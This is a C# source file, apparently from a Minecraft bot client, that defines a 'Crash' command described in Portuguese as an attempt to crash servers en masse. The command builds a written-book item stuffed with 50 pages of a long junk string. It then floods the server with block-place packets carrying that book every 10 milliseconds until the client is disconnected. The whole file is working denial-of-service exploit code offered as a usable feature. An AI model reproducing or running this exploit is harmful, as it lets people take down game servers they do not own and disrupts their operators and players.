using AdvancedBot.client.Map;
using AdvancedBot.client.NBT;
using AdvancedBot.client.Packets;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AdvancedBot.client.Commands
{
    public class CommandCrash : CommandBase
    {
        private static ItemStack book = new ItemStack(Items.written_book);
        public CommandCrash(MinecraftClient cli)
            : base(cli, "Crash", "Tenta crashar um servidor em massa", "crash")
        {
        }
        public override CommandResult Run(string alias, string[] args)
        {
            Toggle(args);
            book = new ItemStack(Items.written_book);
            Client.PrintToChat("§eCrashando servidor...");
            var task = Task.Run(async () => {
                try
                {
                    ListTag<StringTag> list = new ListTag<StringTag>();
                    CompoundTag tag = new CompoundTag();
                    String author = Client.Username;
                    String title = "Play with me.";
                    String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i = 0; i < 50; ++i)
                    {
                        String siteContent = size;
                        StringTag tString = new StringTag("", siteContent);
                        list.AddTag(tString);
                    }
                    tag.AddString("author", author);
                    tag.AddString("title", title);
                    tag.Add("pages", list);
                    book.NBTData = tag;
                    book.NBTData.Add("pages", list);
                    
                    while (Client.IsBeingTicked())
                    {
                        Client.SendPacket(new PacketBlockPlace(new HitResult(
                            (int)Client.Player.PosX, 
                            (int)Client.Player.PosY - 2, 
                            (int)Client.Player.PosZ, 0)
                            , book));
                        Thread.Sleep(10);
                    }
                    Client.PrintToChat("§eParando o envio de packets, o cliente foi desconectado");
                }
                catch (Exception e){ Debug.WriteLine(e.ToString()); }
            });
            return CommandResult.Success;
        }
    }
}
